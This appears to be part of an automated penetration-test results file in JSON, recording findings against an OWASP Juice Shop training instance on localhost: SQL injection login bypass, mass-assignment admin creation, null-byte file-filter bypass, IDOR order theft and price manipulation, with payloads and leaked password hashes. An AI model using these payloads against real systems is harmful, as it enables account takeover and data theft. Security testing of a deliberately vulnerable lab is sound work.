+        "proof_excerpt": "GET /ftp/suspicious_errors.yml%2500.md returned 200 with YAML content containing detection rules for blocked illegal activity, file upload errors, redirect issues",
+        "poc_hint": "Internal security monitoring rules exposed via null byte bypass"
+      },
+      {
+        "title": "File Upload Endpoint Exists",
+        "location": "POST http://127.0.0.1:3010/file-upload",
+        "proof_excerpt": "POST /file-upload -F \"file=@/etc/hostname\" returned HTTP 204 No Content, file was accepted",
+        "poc_hint": "/file-upload accepts file uploads (204 No Content response). No authentication required"
+      },
+      {
+        "title": "Known Vulnerable Dependency - express-jwt 0.1.3",
+        "location": "http://127.0.0.1:3010/ftp/package.json.bak%2500.md",
+        "proof_excerpt": "Package.json shows \"express-jwt\": \"0.1.3\" which has known vulnerabilities: CVE-2020-15084 (jku header bypass), CVE-2021-23802 (algorithm confusion)",
+        "poc_hint": "express-jwt 0.1.3 is vulnerable to authentication bypass via jku header injection"
+      },
+      {
+        "title": "IDOR - Cross-User Basket Checkout (Order Theft)",
+        "location": "POST http://127.0.0.1:3010/rest/basket/{id}/checkout",
+        "proof_excerpt": "User A (bid=9) successfully checked out User B's basket (bid=10) with items User B had added, receiving orderConfirmation \"f806-5f3ba92e2a9463d2\". The order appeared in User A's order history (totalPrice:3.98) while User B's order history was empty. This allows any authenticated user to steal another user's basket items.",
+        "poc_hint": "Authenticate as different user, POST /rest/basket/{victim_basket_id}/checkout"
+      },
+      {
+        "title": "IDOR - Cross-User Profile Access",
+        "location": "GET http://127.0.0.1:3010/api/Users/{id}",
+        "proof_excerpt": "GET /api/Users/31 as User A returned {\"email\":\"testuser_b@test.com\",\"role\":\"customer\"}. GET /api/Users/1 as User A returned {\"email\":\"admin@juice-sh.op\",\"role\":\"admin\"}. Any authenticated user can read any user's profile including email, role, and isActive status.",
+        "poc_hint": "GET /api/Users/{target_id} with any valid JWT token"
+      },
+      {
+        "title": "IDOR - Cross-User Basket Reading",
+        "location": "GET http://127.0.0.1:3010/rest/basket/{id}",
+        "proof_excerpt": "GET /rest/basket/10 (User B's basket) as User A returned {\"id\":10,\"UserId\":31,\"Products\":[{\"id\":1,\"name\":\"Apple Juice (1000ml)\",\"price\":1.99}]}. GET /rest/basket/1 (admin's basket) as User A also returned full basket data.",
+        "poc_hint": "GET /rest/basket/{target_bid} with any valid JWT token"
+      },
+      {
+        "title": "Broken Access Control - Admin Configuration Leak",
+        "location": "GET http://127.0.0.1:3010/rest/admin/application-configuration",
+        "proof_excerpt": "GET /rest/admin/application-configuration as regular user (User A) returned full config object containing: Google OAuth clientId \"1005568560502-6hm16lef8oh46hr2d98vf2ohlnj4nfhq.apps.googleusercontent.com\", full product catalog with prices/deluxePrices, all challenge configurations with XSS bonus payload, chatbot model/avatar settings, social media URLs, CSF hash, and memory data with geo-stalking answers.",
+        "poc_hint": "GET /rest/admin/application-configuration with any valid JWT (no admin role required)"
+      },
+      {
+        "title": "Broken Access Control - Admin Version Endpoint",
+        "location": "GET http://127.0.0.1:3010/rest/admin/application-version",
+        "proof_excerpt": "GET /rest/admin/application-version as regular user returned {\"version\":\"20.1.1\"}. Admin-only version info is accessible to any authenticated user.",
+        "poc_hint": "GET /rest/admin/application-version with any valid JWT"
+      },
+      {
+        "title": "Business Logic - Negative Quantity Pricing Manipulation",
+        "location": "POST http://127.0.0.1:3010/api/BasketItems",
+        "proof_excerpt": "POST with {\"ProductId\":2,\"BasketId\":9,\"quantity\":-5} returned success with {\"quantity\":-5}. Checkout resulted in order with totalPrice:-14.950000000000001 and products:[{\"quantity\":-5,\"name\":\"Orange Juice (1000ml)\",\"price\":2.99,\"total\":-14.95}]. Negative quantities produce negative total prices.",
+        "poc_hint": "POST /api/BasketItems with negative quantity value to get negative order totals"
+      },
+      {
+        "title": "Forged Feedback - Cross-User Feedback Submission",
+        "location": "POST http://127.0.0.1:3010/api/Feedbacks",
+        "proof_excerpt": "POST as User A with {\"UserId\":31,\"comment\":\"Forged feedback from A pretending to be B\",\"rating\":3,\"captchaId\":2,\"captcha\":\"12\"} returned success with {\"id\":16,\"UserId\":31}. User A successfully submitted feedback attributed to User B.",
+        "poc_hint": "POST /api/Feedbacks with arbitrary UserId value to impersonate other users"
+      },
+      {
+        "title": "Broken Access Control - Unauthorized Feedback Deletion",
+        "location": "DELETE http://127.0.0.1:3010/api/Feedbacks/{id}",
+        "proof_excerpt": "DELETE /api/Feedbacks/1 as User A (non-admin) returned {\"status\":\"success\",\"data\":{}}. Any authenticated user can delete any feedback without authorization.",
+        "poc_hint": "DELETE /api/Feedbacks/{id} with any valid JWT"
+      },
+      {
+        "title": "Excessive Data Exposure - Memories API Leaks Password Hashes",
+        "location": "GET http://127.0.0.1:3010/rest/memories",
+        "proof_excerpt": "GET /rest/memories as User A returned 10 memories each with full User object including password hashes: {\"email\":\"bjoern@owasp.org\",\"password\":\"cc03e747a6afbbcbf8be7668acfebee5\"}, {\"email\":\"bjoern.kimminich@gmail.com\",\"password\":\"6edd9d726cbdc873c539e41ae8757b8c\"}, {\"email\":\"ethereum@juice-sh.op\",\"password\":\"2c17c6393771ee3048ae34d6b380c5ec\"}, {\"email\":\"john@juice-sh.op\",\"password\":\"00479e957b6b42c459ee5746478e4d45\"}, {\"email\":\"emma@juice-sh.op\",\"password\":\"402f1c4a75e316afec5a6ea63147f739\"}. Also exposes deluxeToken values.",
+        "poc_hint": "GET /rest/memories with any valid JWT to get all user password hashes"
+      },
+      {
+        "title": "Unauthenticated Order Tracking",
+        "location": "GET http://127.0.0.1:3010/rest/track-order/{orderId}",
+        "proof_excerpt": "GET /rest/track-order/f806-ce62ebfcca035608 without any authentication returned full order details: {\"totalPrice\":-14.95,\"products\":[{\"quantity\":-5,\"name\":\"Orange Juice (1000ml)\",\"price\":2.99,\"total\":-14.95}],\"email\":\"t*st*s*r_*@t*st.c*m\"}. GET /rest/track-order/5267-3122026aa8431150 as User A returned admin's order with masked email.",
+        "poc_hint": "Any order can be tracked without authentication using its orderId"
+      },
+      {
+        "title": "IDOR - Cross-User BasketItem Access",
+        "location": "GET http://127.0.0.1:3010/api/BasketItems?basketId={id}",
+        "proof_excerpt": "GET /api/BasketItems?basketId=10 as User A returned all BasketItems across multiple baskets (baskets 2,3,4,5) including items that do not belong to User A. The basketId filter appears to be ignored, leaking global basket data.",
+        "poc_hint": "GET /api/BasketItems with any basketId parameter"
+      },
+      {
+        "title": "Excessive Data Exposure - Challenge Definitions",
+        "location": "GET http://127.0.0.1:3010/api/Challenges",
+        "proof_excerpt": "GET /api/Challenges without authentication returned all challenge definitions including names, categories, difficulty levels, descriptions, and solved status for 100+ challenges. Exposes internal CTF challenge structure.",
+        "poc_hint": "GET /api/Challenges - no authentication required"
+      },
+      {
+        "title": "Excessive Data Exposure - Inventory and Stock Levels",
+        "location": "GET http://127.0.0.1:3010/api/Quantitys",
+        "proof_excerpt": "GET /api/Quantitys as User A returned all product quantities and per-user limits for 56 products. Reveals inventory levels (e.g., ProductId 27 has quantity 0, ProductId 33 has limitPerUser:1) enabling stock manipulation attacks.",
+        "poc_hint": "GET /api/Quantitys with any valid JWT"
+      },
+      {
+        "title": "Weak Access Control - Coupon Code Exposure in FTP",
+        "location": "GET http://127.0.0.1:3010/ftp/coupons_2013.md.bak%2500.md",
+        "proof_excerpt": "GET /ftp/coupons_2013.md.bak%2500.md (null byte bypass) returned coupon codes: n<MibgC7sn, mNYS#gC7sn, o*IVigC7sn, k#pDlgC7sn, etc. Coupon data leaked via directory listing and null byte bypass.",
+        "poc_hint": "Use null byte injection (%2500.md) to access .bak files in /ftp/"
+      },
+      {
+        "title": "Unauthenticated Order History (Admin)",
+        "location": "GET http://127.0.0.1:3010/rest/order-history",
+        "proof_excerpt": "GET /rest/order-history as admin returned order history with partially masked emails e.g. \"*dm*n@j**c*-sh.*p\" and product details. Note: regular users only see their own orders but admin sees all. Order tracking is completely unauthenticated.",
+        "poc_hint": "Admin can view all orders; order tracking via /rest/track-order is public"
+      },
+      {
+        "title": "SQL Injection in Login - Authentication Bypass as Admin",
+        "location": "POST http://127.0.0.1:3010/rest/user/login",
+        "proof_excerpt": "POST with payload {\"email\":\"' OR 1=1--\",\"password\":\"test\"} returned 200 with body \"authentication\":{\"token\":\"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...\"} and \"umail\":\"admin@juice-sh.op\", proving SQL injection login bypass as admin user.",
+        "poc_hint": "SQL injection in email field of login form. Payload: ' OR 1=1--"
+      },
+      {
+        "title": "Mass Assignment - Unauthenticated Admin Registration",
+        "location": "POST http://127.0.0.1:3010/api/Users",
+        "proof_excerpt": "POST with {\"email\":\"massadmin2@test.com\",\"password\":\"test123\",\"role\":\"admin\"} returned 201 with body containing \"role\":\"admin\",\"id\":32, proving mass assignment allows unauthenticated admin registration.",
+        "poc_hint": "Include \"role\":\"admin\" in POST body to /api/Users to create admin account without authentication"
+      },
+      {
+        "title": "Security Question Exposed for Any User (No Auth)",
+        "location": "GET http://127.0.0.1:3010/rest/user/security-question?email=",
+        "proof_excerpt": "GET /rest/user/security-question?email=admin@juice-sh.op returned {\"question\":{\"id\":2,\"question\":\"Mother's maiden name?\"}} leaking security questions for any email without authentication.",
+        "poc_hint": "Leaks security question for any email, aiding brute-force password reset attacks"
+      },
+      {
+        "title": "Null Byte Injection - File Extension Bypass for YAML",
+        "location": "GET http://127.0.0.1:3010/ftp/{file}%2500.md",
+        "proof_excerpt": "GET /ftp/suspicious_errors.yml%2500.md returned 200 with full YAML content (723 bytes, text/yaml) bypassing the '.md/.pdf only' restriction via double URL-encoded null byte injection.",
+        "poc_hint": "Append %2500.md to bypass file extension filter on /ftp/ directory"
+      },
+      {
+        "title": "Sensitive File Exposure - KeePass Password Database",
+        "location": "GET http://127.0.0.1:3010/ftp/incident-support.kdbx%2500.md",
+        "proof_excerpt": "GET /ftp/incident-support.kdbx%2500.md returned 200 with 3246 bytes of binary KeePass database content (application/octet-stream), exposing sensitive password vault via null byte bypass.",
+        "poc_hint": "KeePass database file containing incident support credentials, accessible via null byte injection"
+      }
+    ],
+    "facts": [
+      {
+        "key": "target_info",
+        "summary": "OWASP Juice Shop at http://127.0.0.1:3010"
+      },
+      {
+        "summary": "Target is OWASP Juice Shop running Express ^4.22.1 on Node.js with SQLite database"
+      },
+      {
+        "summary": "Authentication uses JWT tokens verified by express-jwt 0.1.3"
+      },
+      {
+        "summary": "FTP directory listing enabled with file extension whitelist bypassed via null byte"
+      },
+      {
+        "summary": "User database contains 24+ users including admin, customer, deluxe, and accounting roles"
+      },
+      {
+        "summary": "Password stored as MD5 hash (0192023a7bbd73250516f069df18b500 for admin)"
+      },
+      {
+        "summary": "Admin JWT token obtained via SQLi: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..."
+      },
+      {
+        "summary": "Application exposes REST API at /rest/* and CRUD API at /api/*"
+      },
+      {
+        "summary": "File server at /ftp/* restricts to .md and .pdf extensions but bypassable"
+      },
+      {
+        "summary": "Registration does not sanitize 'role' field allowing mass assignment"
+      },
+      {
+        "summary": "Hiring page at /#/jobs and score-board at /#/score-board"
+      },
+      {
+        "summary": "Easter egg page at /the/devs/are/so/funny/they/hid/an/easter/egg/within/the/easter/egg renders 3D scene"
+      },
+      {
+        "summary": "Login endpoint at /rest/user/login accepts JSON POST with email/password fields"
+      },
+      {
+        "summary": "SQL injection in email field with ' OR 1=1-- bypasses authentication and returns admin JWT"
+      },
+      {
+        "summary": "Registration at /api/Users accepts JSON POST and allows setting role=admin via mass assignment"
+      },
+      {
+        "summary": "Password change operates via GET request with query parameters (current, new, repeat)"
+      },
+      {
+        "summary": "Password reset via POST /rest/user/reset-password requires email, answer, new, repeat"
+      },
+      {
+        "summary": "Security question for any email can be retrieved via GET /rest/user/security-question?email="
+      },
+      {
+        "summary": "Admin security question: 'Mother's maiden name?'"
+      },
+      {
+        "summary": "Bjoern's security question: 'Name of your favorite pet?' with answer 'Zaya'"
+      },
+      {
+        "summary": "Captcha at /rest/captcha returns answer in response body (math question)"
+      },
+      {
+        "summary": "JWT uses RS256 algorithm, no exp claim, tokens never expire"
+      },
+      {
+        "summary": "JWT contains password hash, role, email, and other sensitive user data in payload"
+      },
+      {
+        "summary": "Dual auth methods supported: Authorization Bearer header and token cookie"
+      },
+      {
+        "summary": "No logout endpoint exists - token-based sessions cannot be invalidated server-side"
+      },
+      {
+        "summary": "Login endpoint shows no rate limiting headers"
+      },
+      {
+        "summary": "Reset-password endpoint shows rate limiting (x-ratelimit-limit: 100)"
+      },
+      {
+        "summary": "/api/Challenges publicly accessible without authentication"
+      },
+      {
+        "summary": "/api/Feedbacks publicly accessible without authentication"
+      },
+      {
+        "summary": "/api/BasketItems accessible with any valid JWT showing all users' basket data"
+      },
+      {
+        "summary": "Password hashes use MD5 - easily reversible"
+      },
+      {
+        "summary": "OAuth/social login endpoints not found (/rest/user/oauth returns 500)"
+      },
+      {
+        "summary": "NoSQL injection confirmed in login - MongoDB operator objects passed to hash function cause crash"
+      },
+      {
+        "summary": "Reflected XSS confirmed in search q parameter via bypassSecurityTrustHtml/innerHTML"
+      },
+      {
+        "summary": "Stored XSS confirmed in product reviews API - script/HTML tags stored verbatim"
+      },
+      {
+        "summary": "File upload endpoint /file-upload accepts file uploads (204 No Content)"
+      },
+      {
+        "summary": "Full application configuration exposed without authentication at /rest/admin/application-configuration"
+      },
+      {
+        "summary": "Memories API exposes user password hashes embedded in response objects"
+      },
+      {
+        "summary": "Quantitys, Addresss, Cards APIs all expose sensitive data without proper access control"
+      },
+      {
+        "summary": "Order tracking endpoint /rest/track-order/{id} requires no authentication"
+      },
+      {
+        "summary": "Checkout endpoint /rest/basket/{bid}/checkout processes orders without payment verification"
+      },
+      {
+        "summary": "Admin user (id=1, bid=1) obtained via SQL injection login bypass (email=' OR 1=1--)"
+      },
+      {
+        "summary": "User A created: id=30, bid=9, role=customer, email=testuser_a@test.com"
+      },
+      {
+        "summary": "User B created: id=31, bid=10, role=customer, email=testuser_b@test.com"
+      },
+      {
+        "summary": "JWT tokens use RS256 algorithm - no expiry (iat only, no exp claim)"
+      },
+      {
+        "summary": "Basket items can be added with negative quantities - no input validation on quantity"
+      },
+      {
+        "summary": "Checkout succeeds with empty baskets, negative totals, and with addressId parameter"
+      },
+      {
+        "summary": "Feedback requires captcha which exposes answer in response"
+      },
+      {
+        "summary": "/rest/admin/application-configuration is accessible to all authenticated users regardless of role"
+      },
+      {
+        "summary": "Password hashes are MD5 (cryptographically weak) stored in database and exposed via multiple endpoints"
+      },
+      {
+        "summary": "memories API includes full user objects with password hashes via Sequelize eager loading"
+      },
+      {
+        "summary": "No CSRF protection on API endpoints (Bearer token only, no CSRF tokens)"
+      },
+      {
+        "summary": "Target OWASP Juice Shop runs Express ^4.22.1 with SQLite database"
+      },
+      {
+        "summary": "JWT algorithm is RS256 - algorithm confusion attacks rejected by server"
+      },
+      {
+        "summary": "express-jwt version 0.1.3 (known vulnerable) identified in package.json.bak"
+      },
+      {
+        "summary": "sanitize-html version 1.4.2 (known vulnerable to bypasses) identified"
+      },
+      {
+        "summary": "Application version 20.1.1"
+      },
+      {
+        "summary": "Server base path is empty, base URL http://localhost:3000"
+      },
+      {
+        "summary": "OAuth client ID: 1005568560502-6hm16lef8oh46hr2d98vf2ohlnj4nfhq.apps.googleusercontent.com"
+      },
+      {
+        "summary": "Google OAuth authorized redirects include localhost:3000, localhost:4200, 127.0.0.1:3000/4200 via proxy"
+      },
+      {
+        "summary": "Chat bot model: gemma4:e4b with LLM max retries 2"
+      },
+      {
+        "summary": "Custom metrics prefix: juiceshop"
+      },
+      {
+        "summary": "CSAF hash: 7e7ce7c65db3bf0625fcea4573d25cff41f2f7e3474f2c74334b14fc65bb4fd26af802ad17a3a03bf0eee6827a00fb8f7905f338c31b5e6ea9cb31620242e843"
+      },
+      {
+        "summary": "Security.txt acknowledges score-board at /#/score-board"
+      },
+      {
+        "summary": "FTP directory lists 12 files plus quarantine subdirectory"
+      },
+      {
+        "summary": "FTP quarantine directory is also browsable"
+      },
+      {
+        "summary": "/rest/order-history returns 500 'Blocked illegal activity' with stack trace"
+      },
+      {
+        "summary": "/redirect without 'to' parameter throws 500 TypeError: Cannot read properties of undefined (reading 'includes')"
+      },
+      {
+        "summary": "Password change via GET works but requires current password"
+      },
+      {
+        "summary": "No logout endpoint exists - tokens cannot be invalidated server-side"
+      },
+      {
+        "summary": "Feedback POST requires captchaId+captcha fields but captcha answer is leaked"
+      },
+      {
+        "summary": "Admin user password hash (MD5): e6053eb8d35e02ae40beeeacef203c1a"
+      },
+      {
+        "key": "stage_validate_book_summary",
+        "summary": "validate_book completed for OWASP Juice Shop"
+      }
+    ],
+    "deadends": [
+      "/api/Orders - Unexpected path error (500)",
+      "/api/ (root) - Unexpected path error (500)",
+      "/rest/ (root) - Unexpected path error (500)",
+      "/redirect - Open redirect blocked with 'Unrecognized target URL' (406)",
+      "/ftp/suspicious_errors.yml - Direct access blocked by extension filter (403)",
+      "/rest/products/1 - Unexpected path (500), no direct product endpoint",
+      "Feedback POST requires captchaId parameter which requires prior captcha fetch",
+      "POST /rest/user/change-password - Unexpected path error (500) - only GET requests work for password change",
+      "/rest/user/logout - Unexpected path error (500) - no logout endpoint exists",
+      "/rest/user/oauth - Unexpected path error (500) - OAuth endpoint not implemented",
+      "/rest/user/forgot-password - Unexpected path error (500) - different path needed",
+      "/api/SecurityAnswers - 401 Unauthorized - requires different authorization context",
+      "/api/Baskets - Unexpected path error (500) - API endpoint doesn't exist at this path",
+      "/api/SecurityQuestions - 500 syntax error - API exposed but malformed request causes error",
+      "JWT alg:none attack - rejected by server (RS256 properly validated)",
+      "JWT HS256 empty-key attack - rejected by server (RS256 properly validated)",
+      "Password change via POST with JSON body - Unexpected path (500)",
+      "Password change via POST with form data - Unexpected path (500)",
+      "/api/Orders - Unexpected path error (500)",
+      "/api/SecurityAnswers - 401 Unauthorized",
+      "/api/Baskets - Unexpected path error (500)",
+      "/api/SecurityQuestions - 500 syntax error",
+      "/rest/oauth - Unexpected path error (500)",
+      "/rest/recycle - Unexpected path error (500)",
+      "/rest/chatbot - Unexpected path error (500)",
+      "/rest/chatbot/answer - Unexpected path error (500)",
+      "/rest/chatbot/status - Unexpected path error (500)",
+      "/rest/coupon - Unexpected path error (500)",
+      "/rest/admin/ - Unexpected path error (500)",
+      "/rest/delivery-methods - Unexpected path error (500)",
+      "/redirect - Open redirect blocked (406) for unlisted URLs including whitelisted redirects from config",
+      "/rest/user/oauth - Unexpected path error (500)",
+      "/rest/user/logout - Unexpected path error (500)",
+      "/rest/user/forgot-password - Unexpected path error (500)",
+      "JWT alg:none attack - rejected (RS256 validated)",
+      "JWT HS256 empty-key attack - rejected (RS256 validated)",
+      "POST /rest/user/change-password - Unexpected path (500) - only GET works",
+      "/rest/products/1 - Unexpected path (500)",
+      "PATCH /api/Users/{id} - Unexpected path error (500) - user profile update via API not supported",
+      "/rest/basket/{id}/coupon - Unexpected path for all methods (GET/POST/PUT/DELETE) - coupon application via REST API not found",
+      "/rest/products/{id}/reviews - POST/DELETE/PATCH all return 'Unexpected path' (500) - review management via REST not supported",
+      "/api/Addresss/{id} - 'Malicious activity detected' when accessing address owned by another user",
+      "/rest/user/whoami - Returns empty user object {} even with Authorization header - may use cookie-based auth",
+      "/rest/order-history - Blocks with 'Blocked illegal activity' for requests from certain IPs",
+      "/api/ (root) - Unexpected path error (500) - no API index/root endpoint",
+      "/administration - Returns SPA HTML, not actual admin panel",
+      "POST /rest/basket/{id}/checkout with addressId parameter works but doesn't prevent unauthorized basket access",
+      "/rest/order-history - 500 Blocked illegal activity by IP (requires valid JWT with order ownership)",
+      "/rest/user/change-password with wrong current password - 401 'Current password is not correct'",
+      "/redirect without 'to' parameter - 500 TypeError: Cannot read properties of undefined (reading 'includes')",
+      "/api/Addresss without auth - 401 Cannot read properties of undefined (reading 'data')",
+      "/api/Cards without auth - 401 Cannot read properties of undefined (reading 'data')",
+      "/api/Users without auth - 401 UnauthorizedError: No Authorization header was found",
+      "/api/BasketItems without auth - 401 UnauthorizedError: No Authorization header was found",
+      "JWT alg:none attack - server properly validates RS256 signature",
+      "JWT HS256 empty-key attack - server rejects with invalid signature",
+      "Direct access to /ftp/suspicious_errors.yml without null byte - 403 blocked by extension filter",
+      "Direct access to /ftp/incident-support.kdbx without null byte - 403 blocked by extension filter",
+      "POST /rest/user/change-password - 500 Unexpected path error (only GET works)",
+      "/rest/user/logout - 500 Unexpected path error (no logout endpoint)",
+      "/rest/products/1 - 500 Unexpected path error (only /rest/products/1/reviews exists)",
+      "/rest/user/forgot-password - 500 Unexpected path error (path is /rest/user/reset-password instead)",
+      "/api/Orders - Unexpected path error (500)",
+      "/api/ (root) - Unexpected path error (500)",
+      "/rest/ (root) - Unexpected path error (500)",
+      "/redirect - Open redirect blocked with 'Unrecognized target URL' (406)",
+      "/ftp/suspicious_errors.yml - Direct access blocked by extension filter (403)",
+      "/rest/products/1 - Unexpected path (500), no direct product endpoint",
+      "Feedback POST requires captchaId parameter which requires prior captcha fetch",
+      "POST /rest/user/change-password - Unexpected path error (500) - only GET requests work for password change",
+      "/rest/user/logout - Unexpected path error (500) - no logout endpoint exists",
+      "/rest/user/oauth - Unexpected path error (500) - OAuth endpoint not implemented",
+      "/rest/user/forgot-password - Unexpected path error (500) - different path needed",
+      "/api/SecurityAnswers - 401 Unauthorized - requires different authorization context",
+      "/api/Baskets - Unexpected path error (500) - API endpoint doesn't exist at this path",
+      "/api/SecurityQuestions - 500 syntax error - API exposed but malformed request causes error",
+      "JWT alg:none attack - rejected by server (RS256 properly validated)",
+      "JWT HS256 empty-key attack - rejected by server (RS256 properly validated)",
+      "Password change via POST with JSON body - Unexpected path (500)",
+      "Password change via POST with form data - Unexpected path (500)"
+    ],
+    "completed_stages": [
+      "init",
+      "surface",
+      "auth_session",
+      "class_probe",
+      "authz_logic",
+      "component",
+      "validate_book"
+    ]
+  },
+  "processMetrics": {
+    "stages_done": [
+      "init",
+      "surface",
+      "auth_session",
+      "class_probe",
+      "authz_logic",
+      "component",
+      "validate_book"
+    ],
+    "structure_fail_n": 2,
+    "discovery_yield_soft_fail_n": 0,
+    "discovery_yield_notes": [],
+    "new_candidates_n": 120,
+    "surfaces_n": 44,
+    "fanout_packages_n": 28,
+    "coverage_attempts": [
+      {
+        "location": "http://127.0.0.1:3010/#/search",
+        "status": "attempted",
+        "note": "candidate location matched surface"
+      },
+      {
+        "location": "http://127.0.0.1:3010/ftp/",
+        "status": "attempted",
+        "note": "candidate location matched surface"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/products/search",
+        "status": "attempted",
+        "note": "candidate location matched surface"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/user/login",
+        "status": "attempted",
+        "note": "candidate location matched surface"
+      },
+      {
+        "location": "http://127.0.0.1:3010/api/Users",
+        "status": "attempted",
+        "note": "candidate location matched surface"
+      },
+      {
+        "location": "http://127.0.0.1:3010/api/Challenges",
+        "status": "attempted",
+        "note": "candidate location matched surface"
+      },
+      {
+        "location": "http://127.0.0.1:3010/api/Feedbacks",
+        "status": "attempted",
+        "note": "candidate location matched surface"
+      },
+      {
+        "location": "http://127.0.0.1:3010/api/Products",
+        "status": "attempted",
+        "note": "candidate location matched surface"
+      },
+      {
+        "location": "http://127.0.0.1:3010/api/BasketItems",
+        "status": "attempted",
+        "note": "candidate location matched surface"
+      },
+      {
+        "location": "http://127.0.0.1:3010/.well-known/security.txt",
+        "status": "attempted",
+        "note": "candidate location matched surface"
+      },
+      {
+        "location": "http://127.0.0.1:3010/robots.txt",
+        "status": "attempted",
+        "note": "candidate location matched surface"
+      },
+      {
+        "location": "http://127.0.0.1:3010/redirect",
+        "status": "attempted",
+        "note": "candidate location matched surface"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/user/change-password",
+        "status": "attempted",
+        "note": "candidate location matched surface"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/user/reset-password",
+        "status": "attempted",
+        "note": "candidate location matched surface"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/user/security-question",
+        "status": "attempted",
+        "note": "candidate location matched surface"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/user/whoami",
+        "status": "attempted",
+        "note": "candidate location matched surface"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/captcha",
+        "status": "attempted",
+        "note": "candidate location matched surface"
+      },
+      {
+        "location": "http://127.0.0.1:3010/api/Quantitys",
+        "status": "attempted",
+        "note": "candidate location matched surface"
+      },
+      {
+        "location": "http://127.0.0.1:3010/api/Addresss",
+        "status": "attempted",
+        "note": "candidate location matched surface"
+      },
+      {
+        "location": "http://127.0.0.1:3010/api/Cards",
+        "status": "attempted",
+        "note": "candidate location matched surface"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/basket/{id}",
+        "status": "attempted",
+        "note": "candidate location matched surface"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/basket/{bid}/checkout",
+        "status": "attempted",
+        "note": "candidate location matched surface"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/basket/{bid}/coupon/{code}",
+        "status": "attempted",
+        "note": "candidate location matched surface"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/order-history",
+        "status": "attempted",
+        "note": "candidate location matched surface"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/track-order/{orderId}",
+        "status": "attempted",
+        "note": "candidate location matched surface"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/products/1/reviews",
+        "status": "attempted",
+        "note": "candidate location matched surface"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/admin/application-configuration",
+        "status": "attempted",
+        "note": "candidate location matched surface"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/admin/application-version",
+        "status": "attempted",
+        "note": "candidate location matched surface"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/memories",
+        "status": "attempted",
+        "note": "candidate location matched surface"
+      },
+      {
+        "location": "http://127.0.0.1:3010/file-upload",
+        "status": "attempted",
+        "note": "candidate location matched surface"
+      },
+      {
+        "location": "http://127.0.0.1:3010/profile/image/upload",
+        "status": "attempted",
+        "note": "candidate location matched surface"
+      },
+      {
+        "location": "http://127.0.0.1:3010/api/Users/{id}",
+        "status": "untested"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/products/{id}/reviews",
+        "status": "untested"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/basket/{id}/checkout",
+        "status": "untested"
+      },
+      {
+        "location": "http://127.0.0.1:3010/ftp/coupons_2013.md.bak%2500.md",
+        "status": "untested"
+      },
+      {
+        "location": "http://127.0.0.1:3010/ftp/quarantine/",
+        "status": "untested"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/basket/1",
+        "status": "untested"
+      },
+      {
+        "location": "http://127.0.0.1:3010/api/Users/1",
+        "status": "untested"
+      },
+      {
+        "location": "http://127.0.0.1:3010/ftp/suspicious_errors.yml%2500.md",
+        "status": "untested"
+      },
+      {
+        "location": "http://127.0.0.1:3010/ftp/incident-support.kdbx%2500.md",
+        "status": "untested"
+      },
+      {
+        "location": "http://127.0.0.1:3010/ftp/package.json.bak%2500.md",
+        "status": "untested"
+      },
+      {
+        "location": "http://127.0.0.1:3010/rest/basket/{id}/coupon/{code}",
+        "status": "untested"
+      },
+      {
+        "location": "http://127.0.0.1:3010/ftp/package-lock.json.bak%2500.md",
+        "status": "untested"
+      }
+    ],
+    "coverage_attempt_rate": 0.7209302325581395,
+    "book_outcomes": {
+      "booked_n": 18,
+      "reject_hints_n": 2
+    }
+  }
+}
